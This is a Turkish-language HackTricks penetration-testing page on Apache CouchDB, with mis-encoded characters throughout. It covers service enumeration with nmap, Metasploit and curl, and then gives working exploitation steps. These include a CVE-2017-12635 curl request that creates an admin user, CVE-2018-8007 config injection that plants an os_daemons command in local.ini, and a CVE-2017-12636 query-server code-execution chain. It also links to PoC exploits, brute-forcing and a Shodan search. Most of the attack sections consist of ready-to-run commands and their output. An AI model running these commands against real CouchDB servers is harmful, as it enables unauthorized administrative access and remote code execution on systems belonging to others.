# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Temel Bilgiler**

**CouchDB**, verileri her **belge** iÃ§inde bir **anahtar-deÄŸer haritasÄ±** yapÄ±sÄ± kullanarak organize eden Ã§ok yÃ¶nlÃ¼ ve gÃ¼Ã§lÃ¼ bir **belge odaklÄ± veritabanÄ±dÄ±r**. Belge iÃ§indeki alanlar, veri depolama ve alma esnekliÄŸi saÄŸlayarak **anahtar/deÄŸer Ã§iftleri, listeler veya haritalar** olarak temsil edilebilir.

CouchDB'de depolanan her **belge**, belge dÃ¼zeyinde bir **benzersiz tanÄ±mlayÄ±cÄ±** (`_id`) ile atanÄ±r. AyrÄ±ca, veritabanÄ±na yapÄ±lan ve kaydedilen her deÄŸiÅŸiklik, bir **revizyon numarasÄ±** (`_rev`) ile atanÄ±r. Bu revizyon numarasÄ±, deÄŸiÅŸikliklerin verimli bir ÅŸekilde **izlenmesi ve yÃ¶netilmesi** iÃ§in olanak tanÄ±r ve veritabanÄ± iÃ§indeki verilerin kolayca alÄ±nmasÄ±nÄ± ve senkronizasyonunu kolaylaÅŸtÄ±rÄ±r.

**VarsayÄ±lan port:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **Otomatik SayÄ±m**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## Manuel SayÄ±m

### AfiÅŸ
```
curl http://IP:5984/
```
Bu, kurulu CouchDB Ã¶rneÄŸine bir GET isteÄŸi gÃ¶nderir. YanÄ±t aÅŸaÄŸÄ±dakilerden biri gibi gÃ¶rÃ¼nmelidir:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
CouchDB'nin kÃ¶kÃ¼ne eriÅŸirken `401 Unauthorized` alÄ±yorsanÄ±z ve bu gibi bir mesaj gÃ¶rÃ¼yorsanÄ±z: `{"error":"unauthorized","reason":"Authentication required."}` **banner'a veya baÅŸka bir uÃ§ noktaya eriÅŸemezsiniz**.
{% endhint %}

### Bilgi SayÄ±mÄ±

Bu, **GET** isteÄŸi ile eriÅŸebileceÄŸiniz ve bazÄ± ilginÃ§ bilgileri Ã§Ä±karabileceÄŸiniz uÃ§ noktalarÄ±dÄ±r. [**Daha fazla uÃ§ nokta ve daha ayrÄ±ntÄ±lÄ± aÃ§Ä±klamalar iÃ§in couchdb belgelerine**](https://docs.couchdb.org/en/latest/api/index.html) bakabilirsiniz.

* **`/_active_tasks`** Ã‡alÄ±ÅŸan gÃ¶revlerin listesi, gÃ¶rev tÃ¼rÃ¼, adÄ±, durumu ve iÅŸlem kimliÄŸi dahil.
* **`/_all_dbs`** CouchDB Ã¶rneÄŸindeki tÃ¼m veritabanlarÄ±nÄ±n listesini dÃ¶ndÃ¼rÃ¼r.
* **`/_cluster_setup`** KÃ¼me kurulum sihirbazÄ±na gÃ¶re dÃ¼ÄŸÃ¼m veya kÃ¼menin durumunu dÃ¶ndÃ¼rÃ¼r.
* **`/_db_updates`** CouchDB Ã¶rneÄŸindeki tÃ¼m veritabanÄ± olaylarÄ±nÄ±n listesini dÃ¶ndÃ¼rÃ¼r. Bu uÃ§ noktayÄ± kullanmak iÃ§in `_global_changes` veritabanÄ±nÄ±n varlÄ±ÄŸÄ± gereklidir.
* **`/_membership`** KÃ¼menin bir parÃ§asÄ± olan dÃ¼ÄŸÃ¼mleri `cluster_nodes` olarak gÃ¶rÃ¼ntÃ¼ler. `all_nodes` alanÄ±, bu dÃ¼ÄŸÃ¼mÃ¼n bildiÄŸi tÃ¼m dÃ¼ÄŸÃ¼mleri, kÃ¼menin bir parÃ§asÄ± olanlar da dahil olmak Ã¼zere gÃ¶sterir.
* **`/_scheduler/jobs`** Ã‡oÄŸaltma iÅŸlerinin listesi. Her iÅŸ tanÄ±mÄ±, kaynak ve hedef bilgilerini, Ã§oÄŸaltma kimliÄŸini, son olaylarÄ±n geÃ§miÅŸini ve birkaÃ§ diÄŸer ÅŸeyi iÃ§erecektir.
* **`/_scheduler/docs`** Ã‡oÄŸaltma belge durumlarÄ±nÄ±n listesi. `tamamlandÄ±` ve `baÅŸarÄ±sÄ±z` durumlar dahil olmak Ã¼zere tÃ¼m belgeler hakkÄ±nda bilgi iÃ§erir. Her belge iÃ§in belge kimliÄŸini, veritabanÄ±nÄ±, Ã§oÄŸaltma kimliÄŸini, kaynak ve hedefi ve diÄŸer bilgileri dÃ¶ndÃ¼rÃ¼r.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** `/_node/{node-name}` uÃ§ noktasÄ±, isteÄŸi iÅŸleyen sunucunun Erlang dÃ¼ÄŸÃ¼m adÄ±nÄ± doÄŸrulamak iÃ§in kullanÄ±labilir. Bu, `/_node/_local` eriÅŸirken bu bilgiyi almak iÃ§in en faydalÄ±dÄ±r.
* **`/_node/{node-name}/_stats`** `_stats` kaynaÄŸÄ±, Ã§alÄ±ÅŸan sunucu iÃ§in istatistikleri iÃ§eren bir JSON nesnesi dÃ¶ndÃ¼rÃ¼r. `_local` kelimesi, yerel dÃ¼ÄŸÃ¼m adÄ± iÃ§in bir takma ad olarak hizmet eder, bu nedenle tÃ¼m istatistik URL'lerinde `{node-name}` `_local` ile deÄŸiÅŸtirilebilir, yerel dÃ¼ÄŸÃ¼mÃ¼n istatistikleri ile etkileÅŸimde bulunmak iÃ§in.
* **`/_node/{node-name}/_system`** `_system` kaynaÄŸÄ±, Ã§alÄ±ÅŸan sunucu iÃ§in Ã§eÅŸitli sistem dÃ¼zeyindeki istatistikleri iÃ§eren bir JSON nesnesi dÃ¶ndÃ¼rÃ¼r. Mevcut dÃ¼ÄŸÃ¼m bilgilerini almak iÃ§in `{node-name}` olarak `_local` kullanabilirsiniz.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Sunucunun Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±, Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve isteklere yanÄ±t vermeye hazÄ±r olduÄŸunu doÄŸrular. EÄŸer [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) `true` veya `nolb` ise, uÃ§ nokta 404 yanÄ±tÄ± dÃ¶ndÃ¼recektir.
* **`/_uuids`** CouchDB Ã¶rneÄŸinden bir veya daha fazla Evrensel Benzersiz TanÄ±mlayÄ±cÄ± (UUID) talep eder.
* **`/_reshard`** Tamamlanan, baÅŸarÄ±sÄ±z, Ã§alÄ±ÅŸan, durdurulan ve toplam iÅŸlerin sayÄ±sÄ±nÄ± ve kÃ¼medeki yeniden parÃ§alama durumunu dÃ¶ndÃ¼rÃ¼r.

Daha ilginÃ§ bilgiler burada aÃ§Ä±klandÄ±ÄŸÄ± gibi Ã§Ä±karÄ±labilir: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **VeritabanÄ± Listesi**
```
curl -X GET http://IP:5984/_all_dbs
```
EÄŸer bu istek **401 yetkisiz** ile yanÄ±t veriyorsa, veritabanÄ±na eriÅŸmek iÃ§in **geÃ§erli kimlik bilgilerine** ihtiyacÄ±nÄ±z var:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
GeÃ§erli Kimlik Bilgilerini bulmak iÃ§in **ÅŸunu deneyebilirsiniz**: [**hizmeti bruteforce etmek**](../generic-methodologies-and-resources/brute-force.md#couchdb).

Bu, **yeterli ayrÄ±calÄ±klara** sahip olduÄŸunuzda bir couchdb **yanÄ±tÄ±nÄ±n** **Ã¶rneÄŸidir** (Bu sadece bir db listesi):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Database Info

VeritabanÄ± adÄ±nÄ± eriÅŸerek bazÄ± veritabanÄ± bilgilerini (dosya sayÄ±sÄ± ve boyutlarÄ± gibi) alabilirsiniz:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Belge Listesi**

VeritabanÄ±ndaki her bir giriÅŸi listele
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Belgeyi Oku**

Bir veritabanÄ±ndaki bir belgenin iÃ§eriÄŸini oku:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB Yetki YÃ¼kseltme [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Erlang ve JavaScript JSON ayrÄ±ÅŸtÄ±rÄ±cÄ±larÄ± arasÄ±ndaki farklar sayesinde, aÅŸaÄŸÄ±daki isteÄŸi kullanarak `hacktricks:hacktricks` kimlik bilgileriyle **bir yÃ¶netici kullanÄ±cÄ±** oluÅŸturabilirsiniz:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi burada**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Erlang Cookie GÃ¼venlik Genel GÃ¶rÃ¼nÃ¼mÃ¼**

Ã–rnek [buradan](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

CouchDB belgelerinde, Ã¶zellikle kÃ¼me kurulumu ile ilgili bÃ¶lÃ¼mde ([link](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), CouchDB'nin kÃ¼me modunda kullandÄ±ÄŸÄ± portlar tartÄ±ÅŸÄ±lmaktadÄ±r. Tekil modda olduÄŸu gibi, port `5984`'Ã¼n kullanÄ±ldÄ±ÄŸÄ± belirtilmiÅŸtir. AyrÄ±ca, port `5986` dÃ¼ÄŸÃ¼m yerel API'leri iÃ§indir ve Ã¶nemli olarak, Erlang, Erlang Port Mapper Daemon (EPMD) iÃ§in TCP port `4369` gerektirir; bu, bir Erlang kÃ¼mesi iÃ§inde dÃ¼ÄŸÃ¼m iletiÅŸimini kolaylaÅŸtÄ±rÄ±r. Bu yapÄ±, her dÃ¼ÄŸÃ¼mÃ¼n diÄŸer tÃ¼m dÃ¼ÄŸÃ¼mlerle baÄŸlantÄ±lÄ± olduÄŸu bir aÄŸ oluÅŸturur.

Port `4369` ile ilgili kritik bir gÃ¼venlik uyarÄ±sÄ± vurgulanmaktadÄ±r. Bu port, Ä°nternet veya herhangi bir gÃ¼venilmeyen aÄŸ Ã¼zerinden eriÅŸilebilir hale getirilirse, sistemin gÃ¼venliÄŸi "cookie" olarak bilinen benzersiz bir tanÄ±tÄ±cÄ±ya bÃ¼yÃ¼k Ã¶lÃ§Ã¼de baÄŸlÄ±dÄ±r. Bu cookie bir koruma iÅŸlevi gÃ¶rÃ¼r. Ã–rneÄŸin, belirli bir iÅŸlem listesinde "monster" adlÄ± cookie gÃ¶zlemlenebilir; bu, sistemin gÃ¼venlik Ã§erÃ§evesindeki operasyonel rolÃ¼nÃ¼ gÃ¶sterir.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE) baÄŸlamÄ±nda bu "Ã§erez"in nasÄ±l istismar edilebileceÄŸini anlamakla ilgilenenler iÃ§in, daha fazla okuma iÃ§in Ã¶zel bir bÃ¶lÃ¼m mevcuttur. Bu bÃ¶lÃ¼m, sistemler Ã¼zerinde kontrol saÄŸlamak iÃ§in Erlang Ã§erezlerini yetkisiz bir ÅŸekilde kullanma metodolojilerini detaylandÄ±rmaktadÄ±r. **[Erlang Ã§erezlerini RCE iÃ§in istismar etme Ã¼zerine detaylÄ± kÄ±lavuzu buradan keÅŸfedebilirsiniz](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **local.ini'nin DeÄŸiÅŸtirilmesi ile CVE-2018-8007'nin Ä°stismarÄ±**

[Buradan Ã¶rnek](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Apache CouchDB'yi etkileyen, yakÄ±n zamanda aÃ§Ä±klanan bir gÃ¼venlik aÃ§Ä±ÄŸÄ± olan CVE-2018-8007 incelendi ve istismar iÃ§in `local.ini` dosyasÄ±na yazma izinlerinin gerektiÄŸi ortaya Ã§Ä±ktÄ±. GÃ¼venlik kÄ±sÄ±tlamalarÄ± nedeniyle baÅŸlangÄ±Ã§taki hedef sisteme doÄŸrudan uygulanamasa da, keÅŸif amaÃ§larÄ± iÃ§in `local.ini` dosyasÄ±na yazma eriÅŸimi saÄŸlamak Ã¼zere deÄŸiÅŸiklikler yapÄ±ldÄ±. AÅŸaÄŸÄ±da, sÃ¼reci gÃ¶steren detaylÄ± adÄ±mlar ve kod Ã¶rnekleri saÄŸlanmÄ±ÅŸtÄ±r.

Ã–ncelikle, `local.ini` dosyasÄ±nÄ±n yazÄ±labilir olduÄŸundan emin olarak ortam hazÄ±rlanÄ±r ve izinler listelenerek doÄŸrulanÄ±r:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Vulnerabiliteyi istismar etmek iÃ§in, `local.ini` iÃ§indeki `cors/origins` yapÄ±landÄ±rmasÄ±nÄ± hedef alan bir curl komutu Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Bu, `[os_daemons]` bÃ¶lÃ¼mÃ¼nde rastgele kod Ã§alÄ±ÅŸtÄ±rmayÄ± amaÃ§layan yeni bir kÃ¶ken ve ek komutlar enjekte eder:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
Sonraki doÄŸrulama, `local.ini` iÃ§indeki enjekte edilmiÅŸ yapÄ±landÄ±rmayÄ± gÃ¶sterir ve deÄŸiÅŸiklikleri vurgulamak iÃ§in bir yedekle karÅŸÄ±laÅŸtÄ±rÄ±r:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
BaÅŸlangÄ±Ã§ta, beklenen dosya (`/tmp/0xdf`) mevcut deÄŸildir, bu da enjekte edilen komutun henÃ¼z Ã§alÄ±ÅŸtÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶sterir. Daha fazla araÅŸtÄ±rma, CouchDB ile ilgili sÃ¼reÃ§lerin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve bunlar arasÄ±nda enjekte edilen komutu potansiyel olarak Ã§alÄ±ÅŸtÄ±rabilecek birinin bulunduÄŸunu ortaya koyar:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
Belirlenen CouchDB sÃ¼recini sonlandÄ±rarak ve sistemin bunu otomatik olarak yeniden baÅŸlatmasÄ±na izin vererek, enjekte edilen komutun yÃ¼rÃ¼tÃ¼lmesi tetiklenir; bu, daha Ã¶nce kaybolan dosyanÄ±n varlÄ±ÄŸÄ±yla doÄŸrulanÄ±r:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
Bu keÅŸif, belirli koÅŸullar altÄ±nda CVE-2018-8007 istismarÄ±nÄ±n uygulanabilirliÄŸini doÄŸrulamaktadÄ±r; Ã¶zellikle `local.ini` dosyasÄ±na yazÄ±labilir eriÅŸim gereksinimi. SaÄŸlanan kod Ã¶rnekleri ve prosedÃ¼rel adÄ±mlar, istismarÄ± kontrollÃ¼ bir ortamda tekrarlamak iÃ§in net bir rehber sunmaktadÄ±r.

CVE-2018-8007 hakkÄ±nda daha fazla bilgi iÃ§in mdsec'in tavsiyesine bakÄ±n: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **local.ini Ãœzerinde Yazma Ä°zinleri ile CVE-2017-12636'yÄ± KeÅŸfetme**

Ã–rnek [buradan](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

CouchDB sÃ¼reci aracÄ±lÄ±ÄŸÄ±yla kod yÃ¼rÃ¼tÃ¼lmesine olanak tanÄ±yan CVE-2017-12636 olarak bilinen bir zafiyet incelendi; ancak belirli yapÄ±landÄ±rmalar istismarÄ±nÄ± engelleyebilir. Ã‡evrimiÃ§i olarak mevcut olan Ã§ok sayÄ±da KanÄ±tÄ± Konsept (POC) referansÄ±na raÄŸmen, zafiyeti CouchDB sÃ¼rÃ¼m 2'de istismar etmek iÃ§in ayarlamalar gereklidir; bu, genellikle hedeflenen sÃ¼rÃ¼m 1.x'ten farklÄ±dÄ±r. Ä°lk adÄ±mlar, CouchDB sÃ¼rÃ¼mÃ¼nÃ¼ doÄŸrulamayÄ± ve beklenen sorgu sunucularÄ± yolunun yokluÄŸunu onaylamayÄ± iÃ§erir:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
CouchDB sÃ¼rÃ¼m 2.0'Ä± desteklemek iÃ§in yeni bir yol kullanÄ±lmaktadÄ±r:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
Yeni bir sorgu sunucusu ekleme ve Ã§aÄŸÄ±rma giriÅŸimleri, aÅŸaÄŸÄ±daki Ã§Ä±ktÄ± ile gÃ¶sterildiÄŸi gibi izinle ilgili hatalarla karÅŸÄ±laÅŸtÄ±:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Daha fazla araÅŸtÄ±rma, yazÄ±lamayan `local.ini` dosyasÄ±yla ilgili izin sorunlarÄ±nÄ± ortaya Ã§Ä±kardÄ±. Root veya homer eriÅŸimi ile dosya izinlerini deÄŸiÅŸtirerek devam etmek mÃ¼mkÃ¼n hale geldi:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
Sonraki sorgu sunucusu ekleme giriÅŸimleri baÅŸarÄ±lÄ± oldu, yanÄ±tÄ±n hata mesajlarÄ±nÄ±n olmamasÄ±yla gÃ¶sterildi. `local.ini` dosyasÄ±nÄ±n baÅŸarÄ±lÄ± bir ÅŸekilde deÄŸiÅŸtirilmesi dosya karÅŸÄ±laÅŸtÄ±rmasÄ±yla doÄŸrulandÄ±:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
SÃ¼reÃ§, bir veritabanÄ± ve bir belge oluÅŸturulmasÄ±yla devam etti, ardÄ±ndan yeni eklenen sorgu sunucusuna Ã¶zel bir gÃ¶rÃ¼nÃ¼m eÅŸlemesi aracÄ±lÄ±ÄŸÄ±yla kod Ã§alÄ±ÅŸtÄ±rma giriÅŸimi yapÄ±ldÄ±:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
A **[Ã¶zet](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** alternatif bir yÃ¼k ile belirli koÅŸullar altÄ±nda CVE-2017-12636'nÄ±n istismarÄ±na dair daha fazla bilgi sunmaktadÄ±r. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± istismar etmek iÃ§in **yararlÄ± kaynaklar** ÅŸunlardÄ±r:

- [POC istismar kodu](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Ä°stismar VeritabanÄ± giriÅŸi](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## Referanslar

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± Ekip UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± Ekip UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
